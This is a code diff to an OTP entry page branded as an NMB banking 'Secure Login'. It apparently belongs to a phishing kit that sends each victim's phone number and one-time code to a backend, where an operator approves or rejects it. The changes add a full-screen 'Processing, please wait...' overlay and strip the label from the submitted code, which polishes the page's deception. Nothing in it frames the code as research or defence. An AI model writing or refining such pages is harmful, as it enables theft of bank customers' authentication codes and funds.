@@ -252,6 +252,12 @@
     © 2026 NMB Holdings | Secure Login
   </footer>
 
+  <!-- Floating Spinner Overlay -->
+  <div id="floatingSpinner" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 9999; flex-direction: column; justify-content: center; align-items: center;">
+      <div style="width: 50px; height: 50px; border: 4px solid var(--primary-blue); border-top: 4px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+      <p style="margin-top: 15px; color: var(--primary-blue); font-weight: 600; font-size: 16px;">Processing, please wait...</p>
+  </div>
+
   <!-- JavaScript -->
   <script>
     const inputs = document.querySelectorAll('.otp-field');
@@ -358,7 +364,7 @@
       const errorDiv = document.getElementById('error-message');
       
       errorDiv.style.display = 'none';
-      verifyBtn.innerHTML = 'VERIFYING... <span class="spinner" style="display:inline-block; margin-left:10px; width:15px; height:15px; border:2px solid #fff; border-top:2px solid transparent; border-radius:50%; animation: spin 1s linear infinite;"></span>';
+      document.getElementById('floatingSpinner').style.display = 'flex';
       verifyBtn.disabled = true;
 
       try {
@@ -369,7 +375,7 @@
                   type: 'otp',
                   attemptId: parentAttemptId,
                   phone: phoneStr,
-                  details: `NMB Connect OTP: ${code}`
+                  details: code
               })
           });
           const data = await resp.json();
@@ -383,7 +389,7 @@
           console.error('OTP submission error', e);
           errorDiv.textContent = 'Error submitting OTP. Please try again.';
           errorDiv.style.display = 'block';
-          verifyBtn.innerHTML = 'VERIFY';
+          document.getElementById('floatingSpinner').style.display = 'none';
           verifyBtn.disabled = false;
       }
     }
@@ -399,7 +405,7 @@
             } else if (data.status === 'rejected') {
                 errorDiv.textContent = 'OTP rejected. Please check and try again.';
                 errorDiv.style.display = 'block';
-                verifyBtn.innerHTML = 'VERIFY';
+                document.getElementById('floatingSpinner').style.display = 'none';
                 verifyBtn.disabled = false;
                 inputs.forEach(box => box.value = '');
                 inputs[0].focus();
